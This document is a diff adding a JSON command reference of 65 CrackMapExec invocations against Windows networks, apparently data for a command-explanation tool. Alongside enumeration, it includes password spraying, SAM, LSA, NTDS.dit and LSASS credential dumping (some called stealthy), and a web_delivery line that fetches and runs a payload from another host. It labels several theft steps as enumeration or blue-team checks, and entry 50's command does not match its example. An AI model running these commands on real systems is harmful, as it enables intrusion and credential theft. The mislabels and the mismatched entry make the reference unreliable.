@@ -1,0 +1,462 @@
+{
+    "tool": "crackmapexec-enum",
+    "description": "Complete CrackMapExec enumeration command reference covering all protocols from basic to advanced",
+    "total_commands": 65,
+    "commands": [
+        {
+            "id": 1,
+            "category": "SMB Host Enumeration",
+            "command": "crackmapexec smb 192.168.1.0/24",
+            "example": "crackmapexec smb 192.168.1.0/24",
+            "explanation": "Enumerates SMB enabled hosts, signing status, and OS versions across a subnet."
+        },
+        {
+            "id": 2,
+            "category": "SMB Host Enumeration",
+            "command": "crackmapexec smb 10.10.10.10 --fqdn",
+            "example": "crackmapexec smb 10.10.10.10 --fqdn",
+            "explanation": "Retrieves the Fully Qualified Domain Name of the remote host."
+        },
+        {
+            "id": 3,
+            "category": "SMB Host Enumeration",
+            "command": "crackmapexec smb hosts.txt --gen-relay-list relay_targets.txt",
+            "example": "crackmapexec smb hosts.txt --gen-relay-list relay_targets.txt",
+            "explanation": "Enumerates hosts without SMB signing enabled and saves them for relaying."
+        },
+        {
+            "id": 4,
+            "category": "Null Session and Anonymous Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u '' -p ''",
+            "example": "crackmapexec smb 192.168.1.10 -u '' -p ''",
+            "explanation": "Attempts to authenticate using a null session to validate anonymous access."
+        },
+        {
+            "id": 5,
+            "category": "Null Session and Anonymous Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'guest' -p ''",
+            "example": "crackmapexec smb 192.168.1.10 -u 'guest' -p ''",
+            "explanation": "Checks if the Guest account is active and accessible without a password."
+        },
+        {
+            "id": 6,
+            "category": "SMB Share Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u '' -p '' --shares",
+            "example": "crackmapexec smb 192.168.1.10 -u '' -p '' --shares",
+            "explanation": "Lists available SMB shares using a null session."
+        },
+        {
+            "id": 7,
+            "category": "SMB Share Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --shares",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --shares",
+            "explanation": "Lists all shares the specified user has access to with read/write permissions."
+        },
+        {
+            "id": 8,
+            "category": "SMB Share Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M spider_plus",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M spider_plus",
+            "explanation": "Advanced module to map and index all readable files on accessible shares."
+        },
+        {
+            "id": 9,
+            "category": "SMB User and Group Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --users",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --users",
+            "explanation": "Enumerates domain users via SMB query."
+        },
+        {
+            "id": 10,
+            "category": "SMB User and Group Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --groups",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --groups",
+            "explanation": "Enumerates domain groups via SMB query."
+        },
+        {
+            "id": 11,
+            "category": "SMB User and Group Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --local-groups",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --local-groups",
+            "explanation": "Enumerates local groups on the target machine."
+        },
+        {
+            "id": 12,
+            "category": "SMB User and Group Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --rid-brute",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --rid-brute",
+            "explanation": "Brute forces RIDs to enumerate users and groups even if standard listing fails."
+        },
+        {
+            "id": 13,
+            "category": "SMB User and Group Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --rid-brute 10000",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --rid-brute 10000",
+            "explanation": "Performs an extended RID brute force up to 10000 to find hidden accounts."
+        },
+        {
+            "id": 14,
+            "category": "SMB Session and Logged On User Discovery",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --sessions",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --sessions",
+            "explanation": "Enumerates active SMB sessions on the target server."
+        },
+        {
+            "id": 15,
+            "category": "SMB Session and Logged On User Discovery",
+            "command": "crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --loggedon-users",
+            "example": "crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' --loggedon-users",
+            "explanation": "Queries hosts to see which users are currently logged on interactively."
+        },
+        {
+            "id": 16,
+            "category": "SMB Password Policy Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --pass-pol",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --pass-pol",
+            "explanation": "Retrieves the domain password policy including complexity and lockout thresholds."
+        },
+        {
+            "id": 17,
+            "category": "Credential Validation and Authentication Checks",
+            "command": "crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt",
+            "example": "crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt",
+            "explanation": "Sprays a list of credentials across the network to validate access."
+        },
+        {
+            "id": 18,
+            "category": "Credential Validation and Authentication Checks",
+            "command": "crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --local-auth",
+            "example": "crackmapexec smb 192.168.1.0/24 -u 'Administrator' -p 'P@ssword1' --local-auth",
+            "explanation": "Validates credentials against the local SAM database instead of the domain."
+        },
+        {
+            "id": 19,
+            "category": "Credential Validation and Authentication Checks",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --continue-on-success",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --continue-on-success",
+            "explanation": "Continues testing other credentials even after a successful login is found."
+        },
+        {
+            "id": 20,
+            "category": "SMB Local Admin Discovery",
+            "command": "crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123'",
+            "example": "crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1'",
+            "explanation": "Identifies hosts where the provided user has Administrative (Pwn3d!) privileges."
+        },
+        {
+            "id": 21,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M enum_av",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M enum_av",
+            "explanation": "Uses WMI to enumerate installed antivirus software on the target."
+        },
+        {
+            "id": 22,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M iov_list",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M iov_list",
+            "explanation": "Enumerates disconnected user sessions which can be hijackable."
+        },
+        {
+            "id": 23,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M wmi_query -o QUERY='Select * from Win32_OperatingSystem'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M wmi_query -o QUERY='Select * from Win32_OperatingSystem'",
+            "explanation": "Executes a custom WMI query to retrieve specific system information."
+        },
+        {
+            "id": 24,
+            "category": "LDAP Domain Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123'",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1'",
+            "explanation": "Validates domain credentials against the LDAP service."
+        },
+        {
+            "id": 25,
+            "category": "LDAP User Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --users",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --users",
+            "explanation": "Queries LDAP to retrieve a list of all domain users and their descriptions."
+        },
+        {
+            "id": 26,
+            "category": "LDAP User Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --active-users",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --active-users",
+            "explanation": "Filters the user list to show only active (enabled) accounts."
+        },
+        {
+            "id": 27,
+            "category": "LDAP User Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --users --keyword 'pass'",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --users --keyword 'pass'",
+            "explanation": "Searches user descriptions in LDAP for specific keywords like 'pass' or 'secret'."
+        },
+        {
+            "id": 28,
+            "category": "LDAP Group and OU Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --groups",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --groups",
+            "explanation": "Retrieves all groups within the Active Directory domain."
+        },
+        {
+            "id": 29,
+            "category": "LDAP Group and OU Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --groups --keyword 'admin'",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --groups --keyword 'admin'",
+            "explanation": "Filters domain groups to find high-value targets containing 'admin'."
+        },
+        {
+            "id": 30,
+            "category": "LDAP Domain Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --admins",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --admins",
+            "explanation": "Enumerates members of the Domain Admins group via LDAP."
+        },
+        {
+            "id": 31,
+            "category": "LDAP Domain Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --asreproast",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --asreproast",
+            "explanation": "Identifies users without Kerberos pre-authentication enabled (ASREPRoasting candidates)."
+        },
+        {
+            "id": 32,
+            "category": "LDAP Domain Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --kerberoasting",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --kerberoasting",
+            "explanation": "Enumerates users with Service Principal Names (SPNs) set (Kerberoasting candidates)."
+        },
+        {
+            "id": 33,
+            "category": "LDAP Domain Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --trusted-for-delegation",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --trusted-for-delegation",
+            "explanation": "Finds computer and user objects trusted for unconstrained delegation."
+        },
+        {
+            "id": 34,
+            "category": "LDAP Domain Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' --password-not-required",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' --password-not-required",
+            "explanation": "Enumerates accounts that do not require a password to login."
+        },
+        {
+            "id": 35,
+            "category": "LDAP GPO and Policy Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M gpp_password",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M gpp_password",
+            "explanation": "Scans Group Policy Preferences for legacy cPassword attributes."
+        },
+        {
+            "id": 36,
+            "category": "LDAP Domain Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M get_desc",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M get_desc",
+            "explanation": "Extracts and displays the description fields for all domain users."
+        },
+        {
+            "id": 37,
+            "category": "LDAP Domain Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M whoami",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M whoami",
+            "explanation": "Enumerates privileges and group memberships of the current credential context."
+        },
+        {
+            "id": 38,
+            "category": "WinRM Host Enumeration",
+            "command": "crackmapexec winrm 192.168.1.0/24 -u 'user' -p 'Pass123'",
+            "example": "crackmapexec winrm 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1'",
+            "explanation": "Enumerates hosts with WinRM service enabled and validates credentials."
+        },
+        {
+            "id": 39,
+            "category": "WinRM Host Enumeration",
+            "command": "crackmapexec winrm 192.168.1.10 -u 'user' -p 'Pass123' -x 'whoami'",
+            "example": "crackmapexec winrm 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -x 'whoami'",
+            "explanation": "Executes a basic command to verify functional remote code execution privileges."
+        },
+        {
+            "id": 40,
+            "category": "MSSQL Server Enumeration",
+            "command": "crackmapexec mssql 192.168.1.0/24 -u 'user' -p 'Pass123'",
+            "example": "crackmapexec mssql 192.168.1.0/24 -u 'sa' -p 'P@ssword1'",
+            "explanation": "Discovers MSSQL instances and validates SQL login credentials."
+        },
+        {
+            "id": 41,
+            "category": "MSSQL Database and Role Enumeration",
+            "command": "crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' --dbs",
+            "example": "crackmapexec mssql 192.168.1.10 -u 'sa' -p 'P@ssword1' --dbs",
+            "explanation": "Enumerates available databases on the target SQL server."
+        },
+        {
+            "id": 42,
+            "category": "MSSQL Database and Role Enumeration",
+            "command": "crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' --tables",
+            "example": "crackmapexec mssql 192.168.1.10 -u 'sa' -p 'P@ssword1' --tables",
+            "explanation": "Enumerates all tables within the accessible databases."
+        },
+        {
+            "id": 43,
+            "category": "MSSQL Database and Role Enumeration",
+            "command": "crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' -M mssql_priv",
+            "example": "crackmapexec mssql 192.168.1.10 -u 'sa' -p 'P@ssword1' -M mssql_priv",
+            "explanation": "Module to identify current user privileges on the MSSQL server."
+        },
+        {
+            "id": 44,
+            "category": "MSSQL Database and Role Enumeration",
+            "command": "crackmapexec mssql 192.168.1.10 -u 'user' -p 'Pass123' --no-fqdn-resolve",
+            "example": "crackmapexec mssql 192.168.1.10 -u 'sa' -p 'P@ssword1' --no-fqdn-resolve",
+            "explanation": "Performs enumeration while preventing DNS resolution to maintain stealth."
+        },
+        {
+            "id": 45,
+            "category": "SSH Service Enumeration",
+            "command": "crackmapexec ssh 192.168.1.0/24 -u 'user' -p 'Pass123'",
+            "example": "crackmapexec ssh 192.168.1.0/24 -u 'root' -p 'toor'",
+            "explanation": "Enumerates hosts with SSH enabled and checks credential validity."
+        },
+        {
+            "id": 46,
+            "category": "SSH Service Enumeration",
+            "command": "crackmapexec ssh 192.168.1.0/24 -u 'user' --key-file id_rsa",
+            "example": "crackmapexec ssh 192.168.1.0/24 -u 'ubuntu' --key-file /home/user/.ssh/id_rsa",
+            "explanation": "Validates SSH authentication using a private key file instead of a password."
+        },
+        {
+            "id": 47,
+            "category": "Advanced and Combined Real World Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --users --groups --sessions",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --users --groups --sessions",
+            "explanation": "Combines multiple SMB enumeration flags for a comprehensive host snapshot."
+        },
+        {
+            "id": 48,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' -M zerologon",
+            "example": "crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' -M zerologon",
+            "explanation": "Checks domain controllers for the Zerologon vulnerability (CVE-2020-1472)."
+        },
+        {
+            "id": 49,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' -M petitpotam",
+            "example": "crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' -M petitpotam",
+            "explanation": "Checks if the target is vulnerable to PetitPotam coercion."
+        },
+        {
+            "id": 50,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M no pac",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M no_pac",
+            "explanation": "Checks for the No-PAC (Sam the Admin) vulnerability."
+        },
+        {
+            "id": 51,
+            "category": "Output Formatting and Logging",
+            "command": "crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --export results.csv",
+            "example": "crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' --export results.csv",
+            "explanation": "Exports enumeration results to a CSV file for analysis and reporting."
+        },
+        {
+            "id": 52,
+            "category": "Automation and Pipeline Usage",
+            "command": "crackmapexec smb 192.168.1.0/24 -u 'user' -p 'Pass123' --verbose",
+            "example": "crackmapexec smb 192.168.1.0/24 -u 'jsmith' -p 'P@ssword1' --verbose",
+            "explanation": "Enables verbose output to capture detailed debugging information during enumeration."
+        },
+        {
+            "id": 53,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M maq",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M maq",
+            "explanation": "Enumerates the MachineAccountQuota for the domain."
+        },
+        {
+            "id": 54,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec ldap 192.168.1.10 -u 'user' -p 'Pass123' -M adcs",
+            "example": "crackmapexec ldap dc.example.local -u 'jsmith' -p 'P@ssword1' -M adcs",
+            "explanation": "Enumerates Active Directory Certificate Services templates and servers."
+        },
+        {
+            "id": 55,
+            "category": "SMB Share Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --spider SHAREname",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --spider C$",
+            "explanation": "Recursively lists files in a specific share to find interesting data."
+        },
+        {
+            "id": 56,
+            "category": "SMB Share Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --spider SHAREname --content",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --spider C$ --content",
+            "explanation": "Spiders a share and attempts to read file content for sensitive data."
+        },
+        {
+            "id": 57,
+            "category": "SMB Share Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --spider SHAREname --regex 'pass'",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --spider C$ --regex 'password'",
+            "explanation": "Spiders a share searching for files matching a specific regex pattern."
+        },
+        {
+            "id": 58,
+            "category": "Blue Team Exposure and Hardening Validation",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --lsa",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --lsa",
+            "explanation": "Attempts to dump LSA secrets to validate if credentials can be extracted remotely."
+        },
+        {
+            "id": 59,
+            "category": "Blue Team Exposure and Hardening Validation",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --sam",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --sam",
+            "explanation": "Attempts to dump the SAM database to check for local credential exposure."
+        },
+        {
+            "id": 60,
+            "category": "Blue Team Exposure and Hardening Validation",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' --ntds",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' --ntds",
+            "explanation": "Attempts to dump the NTDS.dit file via DRSUAPI to validate DC security."
+        },
+        {
+            "id": 61,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M web_delivery -o URL=http://192.168.1.5/payload",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M web_delivery -o URL=http://192.168.1.5/payload",
+            "explanation": "Simulates a web delivery payload execution for audit purposes."
+        },
+        {
+            "id": 62,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M lsassy",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M lsassy",
+            "explanation": "Advanced module to attempt remote LSASS dumping for credential validation."
+        },
+        {
+            "id": 63,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M nanodump",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M nanodump",
+            "explanation": "Uses NanoDump to attempt a stealthy LSASS dump for evasion testing."
+        },
+        {
+            "id": 64,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M procdump",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M procdump",
+            "explanation": "Uses Sysinternals Procdump to dump LSASS for blue team signature validation."
+        },
+        {
+            "id": 65,
+            "category": "Module Based Enumeration",
+            "command": "crackmapexec smb 192.168.1.10 -u 'user' -p 'Pass123' -M bh_collector",
+            "example": "crackmapexec smb 192.168.1.10 -u 'jsmith' -p 'P@ssword1' -M bh_collector",
+            "explanation": "Runs the BloodHound ingestor module to map domain relationships."
+        }
+    ]
+}
